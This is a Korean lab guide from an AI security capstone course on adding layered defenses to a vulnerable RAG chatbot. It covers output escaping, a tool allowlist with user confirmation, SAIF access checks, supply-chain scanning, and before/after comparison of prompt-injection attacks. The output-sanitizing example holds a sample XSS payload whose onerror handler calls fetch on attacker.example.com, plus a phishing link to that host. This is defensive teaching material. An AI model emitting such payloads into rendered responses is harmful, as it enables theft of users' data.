이 실습은 12주(3개월) AI 보안 캡스톤 프로젝트의 2개월차입니다. [Lab 8: 캡스톤 1개월차 — 취약한 RAG 챗봇 구축과 1차 공격](../lab8-capstone-vulnerable-rag/)에서 정의한 위험 표면을 바탕으로, 입력/모델/출력/툴 실행 계층별 보안 통제를 설계하고, Google SAIF 관점에서 데이터·모델·저장소·서빙 접근통제를 점검합니다. 이어서 AI 공급망 인벤토리를 작성하고 [Lab 7: AI 모델 공급망 보안 점검](../lab7-supply-chain-check/)을 적용한 뒤, 통제를 반영한 v2를 재배포해 1개월차와 동일한 공격 세트로 개선 전/후를 비교합니다. 다음 단계는 [Lab 10: 캡스톤 3개월차 — 위협모델링·레드팀 리포트·사고대응](../lab10-capstone-threatmodel-redteam-ir/)입니다.

2개월차의 목표는 "완전히 안전한 시스템"을 만드는 것이 아닙니다. Lab 8에서 발견한 공격 중 일부는 통제를 추가해도 완전히 막히지 않을 수 있습니다. 이번 실습을 마칠 때는 "이 시스템은 안전하다"가 아니라 **"이 공격은 완화됐고, 이 공격은 아직 남아있다"** 형태로 결과를 정리하는 습관을 들이는 것이 핵심 목표입니다.

## 목표

- 입력/모델/출력/툴 실행 계층별 통제를 설계하고, Lab 8에서 성공한 공격 3~4종에 대한 방어 논리를 설명한다.
- SAIF 관점(데이터, 프레임워크/코드, 저장, 서빙)에서 접근통제·비밀정보 관리·로그 내 민감정보 노출 여부를 점검하고 체크리스트를 작성한다.
- AI 공급망(모델, 임베딩, 벡터DB, 외부 라이브러리, 문서 수집기) 인벤토리를 작성하고 Lab 7의 점검을 적용해 의존성 위험 1개 이상에 대한 대응책을 작성한다.
- 통제를 반영한 v2를 만들고, Lab 8과 동일한 공격 세트로 개선 전/후 결과를 비교한다.

#### (a) 출력 후처리 — 모델 응답 검증/이스케이프

```python
import html
import re

# 응답에 포함되어도 되는 외부 링크 도메인만 허용
ALLOWED_LINK_DOMAINS = {"intranet.example.com"}

LINK_PATTERN = re.compile(r"https?://([^\s/]+)[^\s)]*")


def sanitize_output(text: str) -> str:
    """모델 응답을 셸/SQL/HTML로 그대로 전달하기 전에 검증·이스케이프한다."""
    # 1. HTML 태그/속성을 이스케이프하여 <img onerror=...> 등이
    #    그대로 렌더링되지 않도록 한다.
    escaped = html.escape(text)

    # 2. allowlist에 없는 도메인으로 향하는 링크는 텍스트로만 남기고
    #    클릭 가능한 형태(자동 링크)로 변환되지 않도록 마킹한다.
    def _check_link(match: "re.Match") -> str:
        domain = match.group(1)
        if domain in ALLOWED_LINK_DOMAINS:
            return match.group(0)
        return f"[차단된 외부 링크: {domain}]"

    return LINK_PATTERN.sub(_check_link, escaped)


# 사용 예
raw_response = (
    '회의실 예약 안내입니다. <img src=x onerror="fetch(\'https://attacker.example.com/steal\')"> '
    "자세한 내용은 https://attacker.example.com/phish 를 참고하세요."
)
print(sanitize_output(raw_response))
```

#### (b) 툴 실행 전 승인 — allowlist + 사용자 확인

```python
# 의사코드: Excessive Agency 대응 — 모델이 호출하려는 "도구/명령"을
# allowlist로 먼저 걸러내고, 통과한 경우에도 실행 전 사용자 확인을 요구한다.

ALLOWED_TOOLS = {"search_docs", "summarize_text"}  # 외부 시스템에 영향을 주지 않는 도구만 허용


def confirm_and_run_tool(tool_name: str, arguments: dict, user_confirm_fn) -> dict:
    # 1단계: allowlist 검사 — 목록 외 도구는 즉시 차단
    if tool_name not in ALLOWED_TOOLS:
        return {"status": "blocked", "reason": f"'{tool_name}'은 허용되지 않은 도구입니다."}

    # 2단계: 사용자 확인 — 모델이 자율적으로 실행하지 않고,
    #        실행 전에 사람이 의도와 인자를 확인할 기회를 제공
    summary = f"도구 '{tool_name}'을 다음 인자로 실행하려 합니다: {arguments}"
    if not user_confirm_fn(summary):
        return {"status": "cancelled", "reason": "사용자가 실행을 취소했습니다."}

    # 3단계: 실행 및 로깅 (실제 실행 로직은 별도 함수로 분리)
    result = run_tool_impl(tool_name, arguments)
    log_tool_execution(tool_name, arguments, result)
    return {"status": "executed", "result": result}
```

1. `pip-audit`으로 RAG 챗봇 프로젝트의 의존성(langchain, faiss-cpu, sentence-transformers 등) 취약점을 스캔합니다.

## 결과 확인

8주차의 개선 전/후 비교 표를 채울 때는 아래 기준으로 판정을 구분하세요.

- **완전히 막힌 공격**: v2에서 해당 시나리오를 재실행했을 때, 인젝션 문구나 악성 출력이 응답에 전혀 반영되지 않고 통제(필터링/이스케이프/차단)가 명확히 동작한 경우.
- **부분적으로 완화된 공격**: 인젝션 문구가 일부 응답에 영향을 주거나, 통제가 동작했지만 우회 가능한 변형이 존재하는 경우. (예: HTML 이스케이프는 됐지만 텍스트로 노출된 URL은 여전히 사용자가 수동으로 복사해 접속할 수 있음)
- **여전히 남은 공격**: v2에서도 동일하게(또는 유사하게) 공격이 성공하는 경우. 이 항목은 [Lab 10](../lab10-capstone-threatmodel-redteam-ir/)의 위협모델링/레드팀 리포트에서 우선적으로 다룰 대상으로 표시해 둡니다.

세 범주로 명확히 구분해 기록하는 것이 이번 단계의 핵심입니다. "거의 다 막혔다"처럼 모호한 표현 대신, 시나리오별로 위 세 범주 중 하나를 명시하세요.

## 학습효과

- **계층형 방어(Defense in Depth) 설계**: 입력/모델/출력/툴 실행이라는 4개 계층에 각각 독립적인 통제를 배치함으로써, 하나의 통제가 우회되어도 다른 계층에서 공격을 완화할 수 있는 구조를 직접 설계하고 구현합니다.
- **SAIF 기반 운영 보안 점검**: Google SAIF의 데이터/프레임워크·코드/저장/서빙 관점을 적용해, 모델 자체의 정확성과 무관하게 운영 환경(접근통제, 비밀정보 관리, 로그)에서 발생하는 위험을 체계적으로 점검하는 습관을 갖춥니다.
- **"완화"와 "해결"의 구분**: 보안 통제를 추가한 뒤에도 모든 공격이 사라지지 않는다는 것을 직접 확인하고, 결과를 "완전히 막힘/부분 완화/여전히 남음"으로 정직하게 기록하는 레드팀/블루팀 보고의 기본 원칙을 익힙니다.
